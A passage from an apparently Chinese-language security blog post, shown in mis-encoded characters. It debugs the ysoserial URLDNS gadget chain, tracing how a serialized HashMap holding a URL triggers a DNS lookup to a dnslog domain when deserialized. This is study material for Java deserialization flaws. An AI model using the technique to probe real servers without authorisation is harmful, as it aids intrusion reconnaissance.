<p><img src="19.png" alt=""></p>
<p>è¿›å…¥ä¸‹ä¸€è¡Œä»£ç ï¼ŒReflections.setFieldValue æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ</p>
<p>çœ‹åå­—å°±æ˜¯ä¸€ä¸ªé€šè¿‡åå°„è®¾ç½®æˆå‘˜å˜é‡å€¼çš„åŠŸèƒ½ğŸ˜€</p>
<p>è¿›å…¥å‡½æ•°å†…éƒ¨ï¼Œæ˜¯è¦è®¾ç½®ä¼ å…¥å¯¹è±¡çš„æˆå‘˜å˜é‡ hashCode çš„å€¼</p>
<p><img src="17.png" alt=""></p>
<p>æŸ¥çœ‹å˜é‡å€¼ï¼Œä¼ å…¥å¯¹è±¡æ˜¯åŒ…å« payload çš„ URL å¯¹è±¡ï¼Œè¦å°†å®ƒçš„ hashCode å€¼è®¾ç½®ä¸º - 1</p>
<p><img src="18.png" alt=""></p>
<p>æ‰§è¡Œå®Œè¿™è¡Œä»£ç ï¼Œå‘ç°å˜é‡ u å’Œ ht ä¸­å­˜å‚¨çš„ URL å¯¹è±¡çš„ hashCode å€¼éƒ½å˜ä¸º - 1 äº†</p>
<p><img src="20.png" alt=""></p>
<p>ç„¶åè¿”å› htï¼Œä¹Ÿå°±æ˜¯æ›´æ”¹è¿‡å­˜å‚¨ key çš„ hashCode å€¼çš„ HashMap</p>
<p>å†æ¬¡è¿›å…¥ PalodRunner#runï¼Œè¿”å›çš„ HashMap èµ‹å€¼ç»™ objBeforeï¼Œå†å°†å…¶åºåˆ—åŒ–èµ‹å€¼ç»™ ser</p>
<p><img src="21.png" alt=""></p>
<p>Utils.releasePayload (payload, objBefore) åº”è¯¥æ˜¯é‡Šæ”¾èµ„æºçš„ä»£ç ï¼ˆä¸ç”¨åœ¨æ„ï¼Œå’Œæœ€åè¿”å›å€¼æ— å…³ï¼‰</p>
<p>æœ€åè¿”å› serï¼Œå³å°† ser å€¼èµ‹ç»™å˜é‡ serializedï¼Œæ‰€ä»¥ serialized å°±æ˜¯åºåˆ—åŒ–åçš„ payload</p>
<p><strong>ç»ˆäºï¼å¼€å§‹ååºåˆ—åŒ–è§¦å‘æ¼æ´äº†ï¼</strong></p>
<p>ä»è¿™é‡Œè¿›å…¥ååºåˆ—åŒ–å‡½æ•°</p>
<p><img src="22.png" alt=""></p>
<p>ä»£ç æ³¨é‡Šä¸­è¯´æ˜ï¼Œ<strong>åˆ©ç”¨é“¾ä» HashMap#readObject () è¿›å…¥ï¼Œç›´åˆ°è¿›å…¥ URL#hashCode () è§¦å‘ DNS è¯·æ±‚</strong></p>
<blockquote>
<p>Gadget Chain:</p>
<ul>
<li>
<pre><code>HashMap.readObject()
</code></pre>
</li>
<li>
<pre><code>HashMap.putVal()
</code></pre>
</li>
<li>
<pre><code>HashMap.hash()
</code></pre>
</li>
<li>
<pre><code>URL.hashCode()
</code></pre>
</li>
</ul>
</blockquote>
<p>é‚£æˆ‘ä»¬å°±ä¸€ç›´ç‚¹ç‚¹ç‚¹ç›´æ¥çœ‹è§ readObject</p>
<p>å¥½äº†è¿‡äº†æ²¡çœ‹è§å˜¤å˜¤å˜¤</p>
<p>ç›´æ¥å» Hash#readObject å¤„ä¸‹ä¸ªæ–­ç‚¹</p>
<p><img src="23.png" alt=""></p>
<p>å¾€ä¸‹ç¿»ç¿»å°±ä¼šçœ‹è§ä¸€æ®µä»£ç ï¼Œåˆçœ‹è§äº†ç†Ÿæ‚‰çš„å•è¯ï¼Œhash</p>
<p><img src="24.png" alt=""></p>
<p>æ ¹æ®åˆ©ç”¨é“¾æˆ‘ä»¬å¯çŸ¥è§¦å‘æ¼æ´çš„ hashCode () å°±åœ¨ hash () ä¸­ï¼Œæˆ‘ä»¬è¿›å…¥è¯¥å‡½æ•°</p>
<p><img src="25.png" alt=""></p>
<p>åˆ°è¾¾ URL#hashCodeï¼Œæœç„¶å…¶ä¸­æœ‰ key.hashCode ()</p>
<p>å› ä¸ºæˆ‘ä»¬åœ¨æ„é€  payload æ—¶å°† hashCode èµ‹å€¼ä¸º - 1ï¼Œæ‰€ä»¥ä¸ä¼šè¿›å…¥ if è€Œæ˜¯æ‰§è¡Œä¸‹é¢çš„ä»£ç </p>
<p>è°ƒç”¨ URLStreamHandler#hashCode</p>
<p><img src="26.png" alt=""></p>
<p>è¿›å…¥ URLStreamHandler#hashCode</p>
<p>æ ¹æ® p ç¥çš„æ–‡ç« æ‰€è¨€ï¼ŒgetHostAddress ä¸­æœ‰ä¸€è¡Œä»£ç </p>
<blockquote>
<p>InetAddress.getByName(host) ;</p>
</blockquote>
<p>å…¶ä½œâ½¤æ˜¯æ ¹æ®ä¸»æœºåï¼Œè·å–å…¶ IP åœ°å€ï¼Œåœ¨â½¹ç»œä¸Šå…¶å®å°±æ˜¯â¼€æ¬¡ DNS æŸ¥è¯¢ï¼Œæ•´ä¸ªè§¦å‘è¿‡ç¨‹å°±å·²ç»å®Œæˆå•¦</p>
<p><img src="27.png" alt=""></p>
<p><img src="28.png" alt=""></p>
<p>åé¢ç»§ç»­è·Ÿè¿›å°±æ˜¯åœ°å€çš„å…·ä½“æŸ¥è¯¢è¿‡ç¨‹äº†ï¼Œæ— äº†æ— äº†</p>
<p>ä¸‹å›¾æ˜¯æ¼æ´è§¦å‘çš„è°ƒç”¨æ ˆ</p>
<p><img src="29.png" alt=""></p>
<h1 id="æ€»ç»“"><a class="markdownIt-Anchor" href="#æ€»ç»“">#</a> æ€»ç»“</h1>
<p><strong>payload æ„é€ </strong></p>
<p>å°†æˆ‘ä»¬è¾“å…¥çš„ dns åœ°å€å­˜å‚¨åœ¨ URL å¯¹è±¡ä¸­ -&gt; å°† URL å¯¹è±¡ä½œä¸º key å­˜å‚¨åœ¨ HashMap ä¸­ -&gt; ç”±äºä½œä¸º key å€¼ï¼Œåœ¨ put æ—¶ä¼šè¿›è¡Œ hash è®¡ç®—ï¼Œé‚£æˆ‘ä»¬å°±é€šè¿‡åå°„æ›´æ”¹å…¶ hashCode å€¼ä¸º - 1</p>
<p><strong>æ¼æ´è§¦å‘</strong></p>
<p>ååºåˆ—åŒ– HashMap æ—¶ï¼Œä¼šè°ƒç”¨ hash () è®¡ç®— key çš„ hash å€¼ -&gt; è®¡ç®—æ—¶ï¼Œè°ƒç”¨ (URL å¯¹è±¡) key#hashCode () -&gt; ç”±äºæˆ‘ä»¬å°†è¯¥å¯¹è±¡çš„ hashCode å€¼è®¾ç½®ä¸º - 1ï¼Œæ‰€ä»¥ä¼šè°ƒç”¨ handler.hashCode () -&gt; å…¶ä¸­è·å–åœ°å€çš„ä»£ç ï¼Œ <code> InetAddress addr = getHostAddress(u);</code>  å®é™…ä¸Šå°±æ˜¯ä¸€æ¬¡ DNS æŸ¥è¯¢</p>
<p><strong>å°å½©è›‹</strong></p>
<p>åœ¨æ„é€  payloadï¼Œht.put () æ—¶ï¼Œç”±äº URL çš„ hashCode å€¼ä¸º - 1ï¼Œæ‰€ä»¥åŒæ ·ä¼šè°ƒç”¨ handler.hashCode () è§¦å‘ DNS æŸ¥è¯¢ï¼Œå¯æ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬åªèƒ½è·å–åˆ°ä¸€æ¡ dns æŸ¥è¯¢è®°å½•ï¼Œè€Œä¸æ˜¯ä¸¤æ¡å‘¢ï¼Ÿ</p>
<p>ç›´æ¥åœ¨ DNS æŸ¥è¯¢å¤„ä¸‹æ–­ç‚¹</p>
<p>ç”Ÿæˆ payload æ—¶ï¼Œè¿›å…¥ URLStreamHandler#hashCode æŸ¥çœ‹å½“å‰å˜é‡</p>
<p><img src="31.png" alt=""></p>
<p>ååºåˆ—åŒ–æ—¶ï¼Œè¿›å…¥ URLStreamHandler#hashCode æŸ¥çœ‹å½“å‰å˜é‡</p>
<p><img src="32.png" alt=""></p>
<p>å¯ä»¥å‘ç°è·å–åˆ°çš„ addr æœ‰å€¼äº†ï¼Œä¸º <code>åŸŸå/127.0.0.1</code></p>
<p>é‚£ä¹ˆåŒæ ·æ˜¯å°† <code>http://ysmzza.dnslog.cn</code>  ä¼ å…¥ <code>getHostAddress(u)</code>  å¾—åˆ°çš„ç»“æœå´ä¸ä¸€æ ·å‘¢ï¼Ÿ</p>
<p>é‚£ä¹ˆæˆ‘ä»¬å†è¿›å…¥ <code>getHostAddress(u)</code>  è¿›è¡Œå¯¹æ¯”</p>
<p>æ„é€  payload è¿›å…¥ <code>getHostAddress(u)</code>  æ—¶ï¼Œå¦‚ä¸‹å›¾</p>
<p><img src="33.png" alt=""></p>
<p><img src="34.png" alt=""></p>
<p>è¿™é‡Œè°ƒç”¨çš„ SilentURLStreamHandler#getHostAddress ç›´æ¥è¿”å›çš„ null</p>
<p>æ³¨é‡Š:</p>
<blockquote>
<p>è¿™ä¸ª URLStreamHandler å®ä¾‹ç”¨äºåœ¨åˆ›å»º URL å®ä¾‹æ—¶é¿å…ä»»ä½• DNS è§£æã€‚ DNS è§£æç”¨äºæ¼æ´æ£€æµ‹ã€‚é‡è¦çš„æ˜¯ä¸è¦åœ¨ä½¿ç”¨åºåˆ—åŒ–å¯¹è±¡ä¹‹å‰æ¢æµ‹ç»™å®šçš„ URLã€‚æ½œåœ¨çš„è¯¯æŠ¥ï¼šå¦‚æœé¦–å…ˆä»æµ‹è¯•è®¡ç®—æœºè§£æ DNS åç§°ï¼Œåˆ™ç›®æ ‡æœåŠ¡å™¨å¯èƒ½ä¼šè·å¾—ç¼“å­˜å‡»ä¸­ç¬¬äºŒä¸ªå†³è®®ã€‚</p>
</blockquote>
<p>è€Œåœ¨æˆ‘ä»¬ååºåˆ—åŒ–åè¿›å…¥ <code>getHostAddress(u)</code> ï¼ŒURL å¯¹è±¡ä¸­çš„ handler å°±æ˜¯é»˜è®¤çš„ handler äº†ï¼Œå› è€Œä¼šè§¦å‘ DNS æŸ¥è¯¢</p>
<p>æ‰€ä»¥ POC ä¸­å®šä¹‰ URLStreamHandler å†…éƒ¨ç±»ï¼Œé¿å…ç”Ÿæˆ paayload æ—¶è¿›è¡Œ DNS è§£æï¼ˆå…¶å®çœ‹æ³¨é‡Šå°±èƒ½çœ‹åˆ°ï¼Œä½†æˆ‘ä¸€å¼€æ²¡æœ‰çœ‹åˆ°è¿™é‡Œçš„ä»£ç  (à¹‘ãƒ»ÌÏ‰à¸Ì€à¹‘)  ï¼‰</p>
<p><strong>å°é—®é¢˜</strong></p>
<ol>
<li>
<p>æ¼æ´æ˜¯é€šè¿‡ URLStreamHandler#hashCode è§¦å‘çš„ï¼Œé‚£ä¹ˆè¿™ä¸ª handler æ˜¯å•¥ç©æ„ï¼Ÿ</p>
</li>
<li>
<p>new URL å¯¹è±¡æ—¶ï¼Œä¸€å®šè¦ä¼ å…¥ handler æ‰èƒ½è§¦å‘æ¼æ´å—ï¼Ÿå¦‚æœä¸ä¼ å…¥ handlerï¼Œç¨‹åºè¿˜èƒ½æ­£å¸¸è¿è¡Œå—ï¼Ÿï¼ˆå› ä¸º HashMap#put æ—¶ä¼šè°ƒç”¨ URLStreamHandler#hashCodeï¼‰ä¼šæœ‰é»˜è®¤çš„ handler ç»™æˆ‘ä»¬è°ƒç”¨å—ï¼Ÿ</p>
</li>
</ol>
<p>æŸ¥æŸ¥ API</p>
<blockquote>
<p>æŠ½è±¡ç±» <code> URLStreamHandler</code>  æ˜¯æ‰€æœ‰æµåè®®å¤„ç†ç¨‹åºçš„é€šç”¨ç±»ï¼Œæµåè®®å¤„ç†ç¨‹åºçŸ¥é“å¦‚ä½•ä¸ºç‰¹å®šåè®®ç±»å‹å»ºç«‹è¿æ¥ï¼Œå¦‚ <code>http</code>  æˆ– <code>https</code> ã€‚</p>
<p>åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œ  <code>URLStreamHandler</code>  å­ç±»çš„å®ä¾‹ä¸æ˜¯ç”±åº”ç”¨ç¨‹åºç›´æ¥åˆ›å»ºçš„ã€‚  æ›´ç¡®åˆ‡åœ°è¯´ï¼Œåœ¨ç¬¬ä¸€æ—¶é—´æ„å»ºæ—¶çš„åè®®åç§°é‡åˆ° <code>URL</code>  ï¼Œé€‚å½“çš„æµåè®®å¤„ç†ç¨‹åºè¢«è‡ªåŠ¨åŠ è½½ã€‚</p>
</blockquote>
<p>æ‰€ä»¥æµåè®®ç¨‹åºç”¨äºä¸ºåè®®å»ºç«‹è¿æ¥ï¼Œå¹¶æ„å»ºæ—¶çš„åè®®åç§°é‡è§ URL æ—¶ï¼Œé€‚å½“çš„æµåè®®å¤„ç†ç¨‹åºè¢«è‡ªåŠ¨åŠ è½½</p>
<p>æ‰€ä»¥å…¶å®ä¸ä¼ å…¥ handlerï¼ŒURL å¯¹è±¡ä¹Ÿä¼šè‡ªåŠ¨åŠ è½½ handler</p>
<p>ç”±å°å½©è›‹çš„å†…å®¹å¯çŸ¥ä¼ å…¥è‡ªå®šä¹‰çš„ handler åªæ˜¯ä¸ºäº†åœ¨ç”Ÿæˆ payload æ—¶ä¸è¿›è¡Œ dns è§£æ</p>
<h2 id="è°ƒè¯•é‡åˆ°çš„é—®é¢˜æœªè§£å†³"><a class="markdownIt-Anchor" href="#è°ƒè¯•é‡åˆ°çš„é—®é¢˜æœªè§£å†³">#</a> è°ƒè¯•é‡åˆ°çš„é—®é¢˜ï¼ˆæœªè§£å†³ï¼‰</h2>
<p>åœ¨å°è¯•ä»£ç è°ƒè¯•æ—¶ï¼Œå‘ç°æ— æ³•å¯ç”¨ debug</p>
<p><img src="7.png" alt=""></p>
<p>çœ‹ç¬¬ä¸€è¡Œï¼Œè¿è¡Œçš„æ˜¯ jdk8_32ï¼Œè€Œæˆ‘çš„ idea æ˜¯ 64 ä½çš„ï¼Œä¼°è®¡æ˜¯ä¸ä¸€è‡´å¯¼è‡´çš„é—®é¢˜ï¼ˆä»¥å‰ç»å¸¸ç¢°è§ tomcat å’Œ jdk ä¸ä¸€è‡´å¯¼è‡´çš„é—®é¢˜ï¼‰</p>
<p>åœ¨ä¸Šæ–¹èœå•æ  file-&gt;project structure ä¸­å¯ä»¥è®¾ç½® jdk ç‰ˆæœ¬ï¼Œæ›´æ”¹ä¸º 64 ä½ jdk</p>
<p><img src="8.png" alt=""></p>
<p>ç„¶åå°±ä¼šæŠ¥é”™ï¼Œç¨‹åºåŒ… sun.rmi.server ä¸å­˜åœ¨</p>
<p><img src="9.png" alt=""></p>
<p>ä½†æ˜¯åœ¨ä½¿ç”¨ jdk8 è¿è¡Œç¨‹åºæ—¶å¹¶æ²¡æœ‰è¯¥é”™è¯¯ï¼Œctrl+click ç‚¹å‡»è¿›å…¥æŠ¥é”™ç¨‹åºåŒ…ï¼Œæ˜¯å¯ä»¥æ‰¾åˆ°åœ¨ java åŸç”Ÿåº“ä¸­çš„</p>
<p><img src="10.png" alt=""></p>
<p>ä¹Ÿå°±æ˜¯è¯´åœ¨ç¼–è¯‘ç¨‹åºçš„ classpath ä¸­æ²¡æœ‰åŒ…å«â€™sun.rmi.serverâ€™è¿™ä¸ªåŒ…</p>
<p>æˆ‘çš„ç›´è§‰å‘Šè¯‰æˆ‘æ˜¯ç‰ˆæœ¬çš„é—®é¢˜ï¼Œå¯æ˜¯ä¸Šå›¾ä¸­ jdk11 çš„åŒ…é‡Œé¢ä¹Ÿæœ‰è¿™ä¸ªåŒ…çš„å¹¶ä¸”å·²ç»å¼•å…¥é¡¹ç›®ä¸­äº†</p>
<p>æ‰€ä»¥æˆ‘æ¢å› jdk8_32ï¼ŒæŸ¥çœ‹ jar åŒ…çš„åŒºåˆ«</p>
<p>jdk8ï¼š</p>
<p><img src="11.png" alt=""></p>
<p>jdk11:</p>
<p><img src="12.png" alt=""></p>
<p>éš¾é“è¿™ä¸ªä¸–ç•Œæœ‰äº›ä¸œè¥¿æˆ‘çœŸçš„ï¼Œéš¾ä»¥æ¢å¯»å—ï¼Œè¿™çœŸçš„å°±æ˜¯æˆ‘çš„æé™äº†å—ï¼Œä¸ï¼Œæˆ‘è¦å»ç™¾åº¦ï¼ï¼ç™¾åº¦æ•‘æˆ‘ï¼ï¼ï¼</p>
<p><strong><a target="_blank" rel="noopener" href="https://xy2401.com/local-docs/oracle/java.zh/11/migrate/#JSMIG-GUID-D7936F0D-08A9-411E-AD2F-E14A38DA56A7">è¿™é‡Œå‘ç°</a>ï¼Œjdk11 ä¸å†æä¾› corba å·¥å…·ï¼Œrmic (RMI ç¼–è¾‘å™¨) ä¸å†æ”¯æŒ - idl æˆ– - iiop é€‰é¡¹ã€‚</strong></p>
<p>å¯æ˜¯ java11 çš„ api é‡Œé¢æ˜¯æœ‰ rmi çš„ğŸ™</p>
<p>æœç„¶æ¢æˆ jdk8_64 æ‰€æœ‰é—®é¢˜è¿åˆƒè€Œè§£ï¼Œé‚£ä¹ˆè¿™ä¸ªé—®é¢˜â€¦</p>
<p>å½“ç„¶ä¸èƒ½ç®—è§£å†³äº†ï¼Œæœªå®Œå¾…ç»­ï¼</p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/categories/">Category</a></li>
         
          <li><a href="/tags/">Tag</a></li>
         
          <li><a href="/search/">Search</a></li>
         
          <li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E7%AE%80%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text"> åˆ©ç”¨é“¾ç®€è¿°</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#urldns%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81"><span class="toc-number">2.</span> <span class="toc-text"> URLDNS åˆ©ç”¨ä»£ç </span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text"> è°ƒè¯•åˆ†æ</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E5%B0%9D%E8%AF%95"><span class="toc-number">3.1.</span> <span class="toc-text"> è¿è¡Œå°è¯•</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E8%B0%83%E8%AF%95"><span class="toc-number">3.2.</span> <span class="toc-text"> ä»£ç è°ƒè¯•</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text"> æ€»ç»“</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98%E6%9C%AA%E8%A7%A3%E5%86%B3"><span class="toc-number">4.1.</span> <span class="toc-text"> è°ƒè¯•é‡åˆ°çš„é—®é¢˜ï¼ˆæœªè§£å†³ï¼‰</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/&text=ysoserialä¹‹URLDNSè°ƒè¯•"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/&title=ysoserialä¹‹URLDNSè°ƒè¯•"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/&is_video=false&description=ysoserialä¹‹URLDNSè°ƒè¯•"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=ysoserialä¹‹URLDNSè°ƒè¯•&body=Check out this article: http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/&title=ysoserialä¹‹URLDNSè°ƒè¯•"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/&title=ysoserialä¹‹URLDNSè°ƒè¯•"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/&title=ysoserialä¹‹URLDNSè°ƒè¯•"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/&title=ysoserialä¹‹URLDNSè°ƒè¯•"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/&name=ysoserialä¹‹URLDNSè°ƒè¯•&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/08/25/ysoserial%E4%B9%8BURLDNS%E8%B0%83%E8%AF%95/&t=ysoserialä¹‹URLDNSè°ƒè¯•"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2021-2022
    John Doe
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/categories/">Category</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
